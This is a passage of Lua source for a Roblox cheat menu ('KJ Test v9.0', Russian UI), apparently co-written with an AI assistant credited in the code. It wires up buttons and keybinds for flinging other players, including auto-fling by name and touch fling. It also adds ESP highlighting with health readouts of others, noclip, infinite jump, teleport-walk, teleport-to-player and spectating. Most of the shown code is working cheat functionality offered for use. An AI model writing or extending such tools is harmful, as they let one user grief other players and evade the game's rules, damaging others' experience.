                if shown >= 10 then break end
            end
        end
        if shown < 10 then
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= LP and plr.Name:lower():sub(1, #text) == text then
                    local btn = Instance.new("TextButton"); btn.Size = UDim2.new(1,0,0,26)
                    btn.BackgroundColor3 = Theme.bg; btn.BorderSizePixel = 0
                    btn.Text = plr.Name
                    btn.TextColor3 = Theme.text; btn.Font = Enum.Font.Gotham
                    btn.TextSize = 11; btn.TextXAlignment = Enum.TextXAlignment.Left
                    btn.Parent = autoSuggest; newCorner(btn,4)
                    btn.MouseButton1Click:Connect(function()
                        GlobalConfig.autoFlingChar = plr.Name; autoBox.Text = plr.Name
                        clearAutoSuggest(); autoSuggest.Visible = false
                    end)
                    shown = shown + 1
                    if shown >= 10 then break end
                end
            end
        end
        autoSuggest.Visible = shown > 0
    end)
    autoBox.FocusLost:Connect(function()
        GlobalConfig.autoFlingChar = autoBox.Text
        task.wait(0.2); clearAutoSuggest(); autoSuggest.Visible = false
    end)
    makeToggle(globalPage, "Авто-Флинг", GlobalConfig.autoFlingEnabled, nO(), function(v) GlobalConfig.autoFlingEnabled = v end)

    makeSection(globalPage, "Бинды", nO())
    makeKeybind(globalPage, "Показать GUI", "toggleGUI", nO())
    makeKeybind(globalPage, "Fling", "fling", nO())
    makeKeybind(globalPage, "Touch Fling", "touchFling", nO())
    makeKeybind(globalPage, "ESP", "esp", nO())
    makeKeybind(globalPage, "Имена", "names", nO())
    makeKeybind(globalPage, "TP Walk", "tpWalk", nO())

    local sorted={}
    for k in pairs(Characters) do table.insert(sorted, k) end
    table.sort(sorted)
    for i,k in ipairs(sorted) do
        if k=="BrutalDemon" then table.remove(sorted,i); table.insert(sorted,k); break end
    end

    for _,ck in ipairs(sorted) do
        local d=Characters[ck]
        local hB=Instance.new("TextButton"); hB.Size=UDim2.new(1,0,0,BTN_H+2)
        hB.BackgroundColor3=Theme.bgCard; hB.BorderSizePixel=0; hB.Text=""
        hB.AutoButtonColor=not d.noExpand; hB.LayoutOrder=nO(); hB.Parent=charsPage; newCorner(hB,8)
        local ab=Instance.new("Frame"); ab.Size=UDim2.new(0,4,1,-8); ab.Position=UDim2.new(0,4,0,4)
        ab.BackgroundColor3=d.colorBase; ab.BorderSizePixel=0; ab.Parent=hB; newCorner(ab,3)
        local hl=Instance.new("TextLabel"); hl.Size=UDim2.new(1,-60,1,0); hl.Position=UDim2.new(0,16,0,0)
        hl.BackgroundTransparency=1; hl.Text=d.name[CurrentLang] or d.name.en or ck
        hl.TextColor3=Theme.text; hl.Font=Enum.Font.GothamBold; hl.TextSize=BIG_FONT
        hl.TextXAlignment=Enum.TextXAlignment.Left; hl.Parent=hB
        local ar=Instance.new("TextLabel"); ar.Size=UDim2.new(0,24,1,0); ar.Position=UDim2.new(1,-30,0,0)
        ar.BackgroundTransparency=1; ar.Text=d.noExpand and "L" or "v"
        ar.TextColor3=Theme.textDim; ar.Font=Enum.Font.GothamBold; ar.TextSize=12; ar.Parent=hB

        if not d.noExpand then
            local bd=Instance.new("Frame"); bd.Size=UDim2.new(1,0,0,0); bd.BackgroundColor3=Color3.fromRGB(20,20,28)
            bd.BorderSizePixel=0; bd.LayoutOrder=nO(); bd.Visible=false; bd.Parent=charsPage; newCorner(bd,8)
            local bl=Instance.new("UIListLayout"); bl.Padding=UDim.new(0,5)
            bl.SortOrder=Enum.SortOrder.LayoutOrder; bl.Parent=bd
            local bp=Instance.new("UIPadding"); bp.PaddingLeft=UDim.new(0,8); bp.PaddingRight=UDim.new(0,8)
            bp.PaddingTop=UDim.new(0,8); bp.PaddingBottom=UDim.new(0,8); bp.Parent=bd
            local bO=0; local function bN() bO=bO+1; return bO end
            makeColorInput(bd, "Цвет базы", d.colorBase, bN(), function(c) d.colorBase=c; ab.BackgroundColor3=c end)
            makeColorInput(bd, "Цвет ульты", d.colorUlt, bN(), function(c) d.colorUlt=c end)
            makeToggle(bd, "Подсветка базы", d.highlightBase, bN(), function(v) d.highlightBase=v end)
            makeToggle(bd, "Подсветка ульты", d.highlightUlt, bN(), function(v) d.highlightUlt=v end)
            makeToggle(bd, "Имя", d.showName, bN(), function(v) d.showName=v end)
            makeToggle(bd, "HP", d.showHp, bN(), function(v) d.showHp=v end)
            makeToggle(bd, "ТП от базы", d.tpFromBase, bN(), function(v) d.tpFromBase=v end)
            makeToggle(bd, "ТП от ульты", d.tpFromUlt, bN(), function(v) d.tpFromUlt=v end)
            makeNumber(bd, "Дистанция", d.distance, bN(), function(v) d.distance=v end)
            makeSection(bd, "Позиция ТП", bN())
            makeNumber(bd, "X", d.position.X, bN(), function(v) d.position=Vector3.new(v,d.position.Y,d.position.Z) end)
            makeNumber(bd, "Y", d.position.Y, bN(), function(v) d.position=Vector3.new(d.position.X,v,d.position.Z) end)
            makeNumber(bd, "Z", d.position.Z, bN(), function(v) d.position=Vector3.new(d.position.X,d.position.Y,v) end)
            if d.ultMoves and #d.ultMoves > 0 then
                local anyEnabled = false
                for _, mn in ipairs(d.ultMoves) do
                    if d.ultTPToggles[mn] ~= nil then anyEnabled = true; break end
                end
                if anyEnabled then
                    makeSection(bd, "Ult TP Beta", bN())
                    for _, mvName in ipairs(d.ultMoves) do
                        if d.ultTPToggles[mvName] ~= nil then
                            local init = d.ultTPToggles[mvName] == true
                            makeToggle(bd, mvName, init, bN(), function(v)
                                d.ultTPToggles[mvName] = v
                            end)
                        end
                    end
                end
            end
            local tpB=Instance.new("TextButton"); tpB.Size=UDim2.new(1,0,0,BTN_H); tpB.BackgroundColor3=d.colorBase
            tpB.BorderSizePixel=0; tpB.Text="ТП сейчас"; tpB.TextColor3=Color3.new(1,1,1)
            tpB.Font=Enum.Font.GothamBold; tpB.TextSize=BIG_FONT
            tpB.LayoutOrder=bN(); tpB.Parent=bd; newCorner(tpB,8)
            tpB.MouseButton1Click:Connect(function()
                local mr=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
                if mr then
                    pcall(function() mr.CFrame=CFrame.new(d.position) end)
                    notify("TP", d.colorBase)
                end
            end)
            local function updS() bd.Size=UDim2.new(1,0,0,bl.AbsoluteContentSize.Y+16) end
            bl:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updS)
            local exp=false
            hB.MouseButton1Click:Connect(function()
                exp=not exp; bd.Visible=exp; ar.Text=exp and "^" or "v"
            end)
        end
    end

    makeSection(movementPage, "Движение", nO())
    makeToggle(movementPage, "TP Walk", GlobalConfig.tpWalkEnabled, nO(), function(v) toggleTpWalk(v) end)
    makeNumber(movementPage, "Скор. TP Walk", GlobalConfig.tpWalkSpeed, nO(), function(v) GlobalConfig.tpWalkSpeed=v end)
    makeToggle(movementPage, "Noclip", GlobalConfig.noclipEnabled, nO(), function(v) toggleNoclip(v) end)
    makeToggle(movementPage, "Беск. прыжок", GlobalConfig.infJumpEnabled, nO(), function(v) toggleInfJump(v) end)
    makeToggle(movementPage, "Ctrl+Клик ТП", GlobalConfig.ctrlClickTP, nO(), function(v) toggleCtrlClickTP(v) end)

    local plist=Instance.new("ScrollingFrame"); plist.Size=UDim2.new(1,0,1,0)
    plist.BackgroundTransparency=1; plist.BorderSizePixel=0; plist.ScrollBarThickness=4
    plist.ScrollBarImageColor3=Theme.accentDark; plist.CanvasSize=UDim2.new(0,0,0,0)
    plist.AutomaticCanvasSize=Enum.AutomaticSize.Y; plist.Parent=playersPage
    local pll=Instance.new("UIListLayout"); pll.Padding=UDim.new(0,5)
    pll.SortOrder=Enum.SortOrder.LayoutOrder; pll.Parent=plist
    local playerRows={}; local rowOrder=0

    local function closeAllPlayerMenus()
        for _, c in ipairs(screenGui:GetChildren()) do
            if c:IsA("Frame") and c:GetAttribute("IsPlayerMenu") then c:Destroy() end
        end
    end

    local function openPlayerMenu(plr)
        closeAllPlayerMenus()
        local menu=Instance.new("Frame"); menu:SetAttribute("IsPlayerMenu", true)
        menu.Size=UDim2.new(0,220,0,0); menu.AutomaticSize=Enum.AutomaticSize.Y
        menu.Position=UDim2.new(0.5,-110,0.5,-120); menu.BackgroundColor3=Theme.bg
        menu.BorderSizePixel=0; menu.ZIndex=400; menu.Active=true; menu.Draggable=true
        menu.Parent=screenGui; newCorner(menu,10); newStroke(menu,Theme.accentDark,1.5)
        local mt=Instance.new("TextLabel"); mt.Size=UDim2.new(1,-34,0,34); mt.Position=UDim2.new(0,0,0,0)
        mt.BackgroundColor3=Theme.headerBg; mt.BorderSizePixel=0; mt.Text=plr.Name
        mt.TextColor3=Theme.text; mt.Font=Enum.Font.GothamBold; mt.TextSize=13
        mt.ZIndex=401; mt.Parent=menu; newCorner(mt,10)
        local closeBtn=Instance.new("TextButton"); closeBtn.Size=UDim2.new(0,28,0,28); closeBtn.Position=UDim2.new(1,-32,0,3)
        closeBtn.BackgroundColor3=Theme.danger; closeBtn.BorderSizePixel=0; closeBtn.Text="x"
        closeBtn.TextColor3=Color3.new(1,1,1); closeBtn.Font=Enum.Font.GothamBold; closeBtn.TextSize=13
        closeBtn.ZIndex=402; closeBtn.Parent=menu; newCorner(closeBtn,6)
        closeBtn.MouseButton1Click:Connect(function() menu:Destroy() end)
        local mlist=Instance.new("UIListLayout"); mlist.Padding=UDim.new(0,5)
        mlist.SortOrder=Enum.SortOrder.LayoutOrder; mlist.Parent=menu
        local mp=Instance.new("UIPadding"); mp.PaddingLeft=UDim.new(0,8); mp.PaddingRight=UDim.new(0,8)
        mp.PaddingTop=UDim.new(0,42); mp.PaddingBottom=UDim.new(0,8); mp.Parent=menu

        local function makeFnBtn(txt, color, cb)
            local b=Instance.new("TextButton"); b.Size=UDim2.new(1,0,0,30)
            b.BackgroundColor3=color; b.BorderSizePixel=0; b.Text=txt
            b.TextColor3=Color3.new(1,1,1); b.Font=Enum.Font.GothamBold
            b.TextSize=12; b.ZIndex=401; b.Parent=menu; newCorner(b,6)
            b.MouseButton1Click:Connect(function() cb(); menu:Destroy() end)
        end

        makeFnBtn("Fling", Color3.fromRGB(180,40,40), function()
            singleFling(plr); notify("Fling: "..plr.Name, Theme.danger)
        end)
        makeFnBtn("ТП к нему", Theme.accentDark, function()
            local tr2=plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
            local mr=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
            if tr2 and mr then mr.CFrame=tr2.CFrame+Vector3.new(0,3,0) end
        end)
        makeFnBtn("Наблюдать", Theme.accentDark, function()
            if plr.Character and plr.Character:FindFirstChild("Head") then
                workspace.CurrentCamera.CameraSubject=plr.Character.Head
                local retBtn=Instance.new("TextButton"); retBtn.Size=UDim2.new(0,180,0,36)
                retBtn.Position=UDim2.new(0.5,-90,0,60); retBtn.BackgroundColor3=Theme.danger
                retBtn.BorderSizePixel=0; retBtn.Text="Back"; retBtn.TextColor3=Color3.new(1,1,1)
                retBtn.Font=Enum.Font.GothamBold; retBtn.TextSize=13; retBtn.ZIndex=500
                retBtn.Parent=screenGui; newCorner(retBtn,8)
                retBtn.MouseButton1Click:Connect(function()
                    local myHum=LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
                    if myHum then workspace.CurrentCamera.CameraSubject=myHum end
                    retBtn:Destroy()
                end)
                task.delay(15, function() if retBtn.Parent then retBtn:Destroy() end end)
            end
        end)
    end

    local function ensureRow(plr)
        if playerRows[plr] then return playerRows[plr] end
        rowOrder=rowOrder+1
        local rowSize = IS_MOBILE and 58 or 50
        local row=Instance.new("TextButton"); row.Size=UDim2.new(1,0,0,rowSize)
        row.BackgroundColor3=Theme.bgCard; row.BorderSizePixel=0; row.Text=""
        row.LayoutOrder=rowOrder; row.Parent=plist; newCorner(row,8)
        local ab=Instance.new("Frame"); ab.Size=UDim2.new(0,4,1,-8); ab.Position=UDim2.new(0,4,0,4)
        ab.BackgroundColor3=Theme.accentDark; ab.BorderSizePixel=0; ab.Parent=row; newCorner(ab,3)
        local nl=Instance.new("TextLabel"); nl.Size=UDim2.new(0.5,0,0,20); nl.Position=UDim2.new(0,16,0,4)
        nl.BackgroundTransparency=1; nl.Text=plr.Name; nl.TextColor3=Theme.text
        nl.Font=Enum.Font.GothamSemibold; nl.TextSize=SMALL_FONT
        nl.TextXAlignment=Enum.TextXAlignment.Left; nl.Parent=row
        local cl=Instance.new("TextLabel"); cl.Size=UDim2.new(0.5,-16,0,20); cl.Position=UDim2.new(0.5,0,0,4)
        cl.BackgroundTransparency=1; cl.Text="-"; cl.TextColor3=Theme.textDim
        cl.Font=Enum.Font.GothamBold; cl.TextSize=SMALL_FONT
        cl.TextXAlignment=Enum.TextXAlignment.Right; cl.Parent=row
        local hpl=Instance.new("TextLabel"); hpl.Size=UDim2.new(1,-32,0,14); hpl.Position=UDim2.new(0,16,0,26)
        hpl.BackgroundTransparency=1; hpl.Text="HP: -"; hpl.TextColor3=Color3.fromRGB(120,255,120)
        hpl.Font=Enum.Font.Gotham; hpl.TextSize=11
        hpl.TextXAlignment=Enum.TextXAlignment.Left; hpl.Parent=row
        local entry={row=row, charLbl=cl, hpLbl=hpl, accentBar=ab}
        row.MouseButton1Click:Connect(function() openPlayerMenu(plr) end)
        playerRows[plr]=entry; return entry
    end

    task.spawn(function() while screenGui and screenGui.Parent do
        task.wait(0.3)
        for plr,e in pairs(playerRows) do if not plr.Parent then e.row:Destroy(); playerRows[plr]=nil end end
        for plr in pairs(tracked) do
            local e=ensureRow(plr); local info=playerData[plr]
            if info then local d=Characters[info.charKey]
                e.charLbl.Text=(d.name[CurrentLang] or d.name.en).." "..(info.form=="ult" and "U" or "B")
                local col=(info.form=="ult") and d.colorUlt or d.colorBase
                e.charLbl.TextColor3=col; e.accentBar.BackgroundColor3=col
            else
                e.charLbl.Text="-"; e.charLbl.TextColor3=Theme.textDim
                e.accentBar.BackgroundColor3=Theme.textDim
            end
            local m=getCharacterModel(plr); local hp,mx=getHp(m,plr)
            if hp then e.hpLbl.Text="HP: "..hp.." / "..mx
                local r=hp/math.max(1,mx)
                e.hpLbl.TextColor3=r>0.6 and Color3.fromRGB(120,255,120) or (r>0.3 and Color3.fromRGB(255,220,80) or Color3.fromRGB(255,90,90))
            else e.hpLbl.Text="HP: -"; e.hpLbl.TextColor3=Theme.textDim end
        end
    end end)

    local nameF=Instance.new("Frame"); nameF.Size=UDim2.new(1,0,0,INPUT_H); nameF.BackgroundColor3=Theme.bgCard
    nameF.BorderSizePixel=0; nameF.LayoutOrder=1; nameF.Parent=configsPage; newCorner(nameF,8)
    local nL=Instance.new("TextLabel"); nL.Size=UDim2.new(0.5,0,1,0); nL.Position=UDim2.new(0,12,0,0)
    nL.BackgroundTransparency=1; nL.Text="Имя конфига"; nL.TextColor3=Theme.text
    nL.Font=Enum.Font.Gotham; nL.TextSize=SMALL_FONT; nL.TextXAlignment=Enum.TextXAlignment.Left; nL.Parent=nameF
    local nBox=Instance.new("TextBox"); nBox.Size=UDim2.new(0,170,0,INPUT_H-8); nBox.Position=UDim2.new(1,-182,0.5,-(INPUT_H-8)/2)
    nBox.BackgroundColor3=Theme.bgAlt; nBox.BorderSizePixel=0; nBox.Text="my_config"
    nBox.TextColor3=Theme.text; nBox.Font=Enum.Font.GothamBold; nBox.TextSize=SMALL_FONT
    nBox.ClearTextOnFocus=false; nBox.Parent=nameF; newCorner(nBox,6)

    local saveB=Instance.new("TextButton"); saveB.Size=UDim2.new(1,0,0,BTN_H); saveB.BackgroundColor3=Theme.success
    saveB.BorderSizePixel=0; saveB.Text="Сохранить"; saveB.TextColor3=Color3.new(1,1,1)
    saveB.Font=Enum.Font.GothamBold; saveB.TextSize=BIG_FONT; saveB.LayoutOrder=2; saveB.Parent=configsPage; newCorner(saveB,8)
    local refreshB=Instance.new("TextButton"); refreshB.Size=UDim2.new(1,0,0,BTN_H); refreshB.BackgroundColor3=Theme.accentDark
    refreshB.BorderSizePixel=0; refreshB.Text="Обновить"; refreshB.TextColor3=Color3.new(1,1,1)
    refreshB.Font=Enum.Font.GothamBold; refreshB.TextSize=SMALL_FONT; refreshB.LayoutOrder=3; refreshB.Parent=configsPage; newCorner(refreshB,8)

    local autoF=Instance.new("Frame"); autoF.Size=UDim2.new(1,0,0,INPUT_H); autoF.BackgroundColor3=Theme.bgCard
    autoF.BorderSizePixel=0; autoF.LayoutOrder=4; autoF.Parent=configsPage; newCorner(autoF,8)
    local autoL=Instance.new("TextLabel"); autoL.Size=UDim2.new(0.5,0,1,0); autoL.Position=UDim2.new(0,12,0,0)
    autoL.BackgroundTransparency=1; autoL.Text="Auto-load:"; autoL.TextColor3=Theme.text
    autoL.Font=Enum.Font.Gotham; autoL.TextSize=11; autoL.TextXAlignment=Enum.TextXAlignment.Left; autoL.Parent=autoF
    local autoBox2=Instance.new("TextBox"); autoBox2.Size=UDim2.new(0,140,0,INPUT_H-8)
    autoBox2.Position=UDim2.new(1,-152,0.5,-(INPUT_H-8)/2); autoBox2.BackgroundColor3=Theme.bgAlt
    autoBox2.BorderSizePixel=0; autoBox2.Text=GlobalConfig.autoLoadConfig
    autoBox2.PlaceholderText="config name"; autoBox2.TextColor3=Theme.text
    autoBox2.Font=Enum.Font.GothamBold; autoBox2.TextSize=11
    autoBox2.ClearTextOnFocus=false; autoBox2.Parent=autoF; newCorner(autoBox2,6)

    local cfgSuggest = Instance.new("Frame"); cfgSuggest.Size = UDim2.new(1,0,0,0)
    cfgSuggest.AutomaticSize = Enum.AutomaticSize.Y; cfgSuggest.BackgroundColor3 = Theme.bgAlt
    cfgSuggest.BorderSizePixel = 0; cfgSuggest.Visible = false
    cfgSuggest.LayoutOrder = 5; cfgSuggest.Parent = configsPage; newCorner(cfgSuggest,8)
    local csl = Instance.new("UIListLayout"); csl.Padding = UDim.new(0,2); csl.Parent = cfgSuggest

    local function clearCfgSuggest()
        for _, c in ipairs(cfgSuggest:GetChildren()) do
            if c:IsA("TextButton") then c:Destroy() end
        end
    end

    autoBox2:GetPropertyChangedSignal("Text"):Connect(function()
        local text = autoBox2.Text:lower()
        clearCfgSuggest()
        if text == "" then cfgSuggest.Visible = false; return end
        local files = listCfg()
        local shown = 0
        for _, fn in ipairs(files) do
            if fn:lower():sub(1, #text) == text then
                local btn = Instance.new("TextButton"); btn.Size = UDim2.new(1,0,0,26)
                btn.BackgroundColor3 = Theme.bg; btn.BorderSizePixel = 0
                btn.Text = fn
                btn.TextColor3 = Theme.text; btn.Font = Enum.Font.Gotham
                btn.TextSize = 11; btn.TextXAlignment = Enum.TextXAlignment.Left
                btn.Parent = cfgSuggest; newCorner(btn,4)
                btn.MouseButton1Click:Connect(function()
                    GlobalConfig.autoLoadConfig = fn
                    autoBox2.Text = fn
                    clearCfgSuggest(); cfgSuggest.Visible = false
                end)
                shown = shown + 1
                if shown >= 10 then break end
            end
        end
        cfgSuggest.Visible = shown > 0
    end)

    autoBox2.FocusLost:Connect(function()
        GlobalConfig.autoLoadConfig = autoBox2.Text
        task.wait(0.2); clearCfgSuggest(); cfgSuggest.Visible = false
        if GlobalConfig.autoLoadConfig ~= "" then
            local ok, data = pcall(loadCfg, GlobalConfig.autoLoadConfig)
            if ok and data then applyCfg(data); notify("Auto-load: "..GlobalConfig.autoLoadConfig, Theme.success) end
        end
    end)

    makeSection(configsPage, "Сохранённые конфиги", 6)
    local listHolder=Instance.new("Frame"); listHolder.Size=UDim2.new(1,0,0,0)
    listHolder.AutomaticSize=Enum.AutomaticSize.Y; listHolder.BackgroundTransparency=1
    listHolder.LayoutOrder=7; listHolder.Parent=configsPage
    local lLH=Instance.new("UIListLayout"); lLH.Padding=UDim.new(0,4)
    lLH.SortOrder=Enum.SortOrder.LayoutOrder; lLH.Parent=listHolder

    local function refreshList()
        for _,c in ipairs(listHolder:GetChildren()) do
            if c:IsA("Frame") or c:IsA("TextLabel") then c:Destroy() end
        end
        local files=listCfg()
        if #files==0 then
            local em=Instance.new("TextLabel"); em.Size=UDim2.new(1,0,0,26); em.BackgroundTransparency=1
            em.Text="Пусто"; em.TextColor3=Theme.textDim; em.Font=Enum.Font.Gotham
            em.TextSize=12; em.Parent=listHolder; return
        end
        for _,fname in ipairs(files) do
            local row=Instance.new("Frame"); row.Size=UDim2.new(1,0,0,BTN_H)
            row.BackgroundColor3=Theme.bgCard; row.BorderSizePixel=0; row.Parent=listHolder; newCorner(row,6)
            local nl=Instance.new("TextLabel"); nl.Size=UDim2.new(0.5,0,1,0); nl.Position=UDim2.new(0,10,0,0)
            nl.BackgroundTransparency=1; nl.Text=fname; nl.TextColor3=Theme.text
            nl.Font=Enum.Font.GothamBold; nl.TextSize=SMALL_FONT
            nl.TextXAlignment=Enum.TextXAlignment.Left; nl.Parent=row
            local lb=Instance.new("TextButton"); lb.Size=UDim2.new(0,70,0,BTN_H-8); lb.Position=UDim2.new(1,-150,0.5,-(BTN_H-8)/2)
            lb.BackgroundColor3=Theme.accentDark; lb.BorderSizePixel=0; lb.Text="Load"
            lb.TextColor3=Color3.new(1,1,1); lb.Font=Enum.Font.GothamBold; lb.TextSize=10
            lb.Parent=row; newCorner(lb,6)
            local db=Instance.new("TextButton"); db.Size=UDim2.new(0,70,0,BTN_H-8); db.Position=UDim2.new(1,-76,0.5,-(BTN_H-8)/2)
            db.BackgroundColor3=Theme.danger; db.BorderSizePixel=0; db.Text="Del"
            db.TextColor3=Color3.new(1,1,1); db.Font=Enum.Font.GothamBold; db.TextSize=10
            db.Parent=row; newCorner(db,6)
            lb.MouseButton1Click:Connect(function()
                local d,e=loadCfg(fname)
                if d then applyCfg(d); notify("Loaded: "..fname, Theme.success)
                    task.wait(0.1)
                    local old=screenGui
                    if old then old.Parent=nil; pcall(function() old:Destroy() end) end
                    destroyAllLabels(); highlights={}; task.wait(); buildGUI()
                else notify("Err: "..tostring(e), Theme.danger) end
            end)
            db.MouseButton1Click:Connect(function()
                local ok=delCfg(fname)
                if ok then notify("Deleted: "..fname, Theme.danger); refreshList() end
            end)
        end
    end
    saveB.MouseButton1Click:Connect(function()
        local nm=nBox.Text:gsub("[^%w_%-%.]","_")
        if nm=="" then nm="config" end
        local ok,e=saveCfg(nm)
        if ok then notify("Saved: "..nm, Theme.success); refreshList()
        else notify("Err: "..tostring(e), Theme.danger) end
    end)
    refreshB.MouseButton1Click:Connect(refreshList); refreshList()

    local authorsHeader = Instance.new("Frame")
    authorsHeader.Size = UDim2.new(1,0,0,80)
    authorsHeader.BackgroundColor3 = Theme.bgCard
    authorsHeader.BorderSizePixel = 0
    authorsHeader.LayoutOrder = 1
    authorsHeader.Parent = authorsPage
    newCorner(authorsHeader, 10)
    local ahIcon = Instance.new("TextLabel")
    ahIcon.Size = UDim2.new(0,60,0,60); ahIcon.Position = UDim2.new(0,15,0.5,-30)
    ahIcon.BackgroundColor3 = Theme.accentDark; ahIcon.BorderSizePixel = 0
    ahIcon.Text = "KJ"; ahIcon.TextColor3 = Color3.new(1,1,1)
    ahIcon.Font = Enum.Font.GothamBold; ahIcon.TextSize = 22
    ahIcon.Parent = authorsHeader; newCorner(ahIcon, 12)
    local ahTitle = Instance.new("TextLabel")
    ahTitle.Size = UDim2.new(1,-90,0,24); ahTitle.Position = UDim2.new(0,85,0,14)
    ahTitle.BackgroundTransparency = 1; ahTitle.Text = "Авторы"
    ahTitle.TextColor3 = Theme.text; ahTitle.Font = Enum.Font.GothamBold
    ahTitle.TextSize = 16; ahTitle.TextXAlignment = Enum.TextXAlignment.Left
    ahTitle.Parent = authorsHeader
    local ahSub = Instance.new("TextLabel")
    ahSub.Size = UDim2.new(1,-90,0,20); ahSub.Position = UDim2.new(0,85,0,40)
    ahSub.BackgroundTransparency = 1; ahSub.Text = "KJ Test v9.0"
    ahSub.TextColor3 = Theme.textDim; ahSub.Font = Enum.Font.Gotham
    ahSub.TextSize = 12; ahSub.TextXAlignment = Enum.TextXAlignment.Left
    ahSub.Parent = authorsHeader

    local function makeAuthorCard(name, role, order)
        local card = Instance.new("Frame"); card.Size = UDim2.new(1,0,0,60)
        card.BackgroundColor3 = Theme.bgCard; card.BorderSizePixel = 0
        card.LayoutOrder = order; card.Parent = authorsPage; newCorner(card, 10)
        local nm = Instance.new("TextLabel"); nm.Size = UDim2.new(1,-20,0,24); nm.Position = UDim2.new(0,14,0,10)
        nm.BackgroundTransparency = 1; nm.Text = name; nm.TextColor3 = Theme.text
        nm.Font = Enum.Font.GothamBold; nm.TextSize = 16
        nm.TextXAlignment = Enum.TextXAlignment.Left; nm.Parent = card
        local rl = Instance.new("TextLabel"); rl.Size = UDim2.new(1,-20,0,20); rl.Position = UDim2.new(0,14,0,32)
        rl.BackgroundTransparency = 1; rl.Text = role; rl.TextColor3 = Theme.textDim
        rl.Font = Enum.Font.Gotham; rl.TextSize = 12
        rl.TextXAlignment = Enum.TextXAlignment.Left; rl.Parent = card
    end

    makeAuthorCard("nikitosiki2000", "Developer", 2)
    makeAuthorCard("deepseek", "AI Assistant", 3)

    local minimized=false; local origSize=main.Size
    minBtn.MouseButton1Click:Connect(function()
        minimized=not minimized
        if minimized then
            main.Size=UDim2.new(0,origSize.X.Offset,0,hdrH)
            tabsFrame.Visible=false; content.Visible=false; minBtn.Text="+"
        else
            main.Size=origSize
            tabsFrame.Visible=true; content.Visible=true; minBtn.Text="-"
            switchPage(currentPage or "global")
        end
    end)

    switchPage("global")
end

local guiVisible=true
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    local kb=GlobalConfig.keybinds
    if input.KeyCode==kb.toggleGUI then
        guiVisible=not guiVisible; if screenGui then screenGui.Enabled=guiVisible end
    elseif input.KeyCode==kb.fling then
        if next(FlingTargets) then startFlinging(); notify("Fling", Theme.success) end
    elseif input.KeyCode==kb.touchFling then
        if touchFlingActive then stopTouchFling() else startTouchFling() end
        notify("Touch Fling: "..(touchFlingActive and "ON" or "OFF"), Theme.accent)
    elseif input.KeyCode==kb.esp then
        GlobalConfig.espEnabled=not GlobalConfig.espEnabled
        if not GlobalConfig.espEnabled then removeAllHighlights() end
        notify("ESP: "..(GlobalConfig.espEnabled and "ON" or "OFF"),
              GlobalConfig.espEnabled and Theme.success or Theme.danger)
    elseif input.KeyCode==kb.names then
        GlobalConfig.forceShowAllUntil=tick()+GlobalConfig.nameShowDuration
        notify("Names shown", Theme.accent)
    elseif input.KeyCode==kb.tpWalk then
        toggleTpWalk(); notify("TP Walk: "..(GlobalConfig.tpWalkEnabled and "ON" or "OFF"),
            GlobalConfig.tpWalkEnabled and Theme.success or Theme.danger)
    end
end)

task.spawn(function()
    while true do
        task.wait(0.2)
        local sg=screenGui
        if sg and sg.Parent and subtitleRef and subtitleRef.Parent then
            local mr=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
            if mr then local p=mr.Position
                subtitleRef.Text=string.format("X: %.0f  Y: %.0f  Z: %.0f", p.X, p.Y, p.Z)
            else subtitleRef.Text="X: -  Y: -  Z: -" end
        end
    end
end)

buildPlatform()
buildGUI()
buildChatIcon()
buildReturnBtn()
buildKillstreak()

print("[KJ TEST v9.0] Loaded.")
if IS_MOBILE then print("[KJ TEST] Mobile mode") end
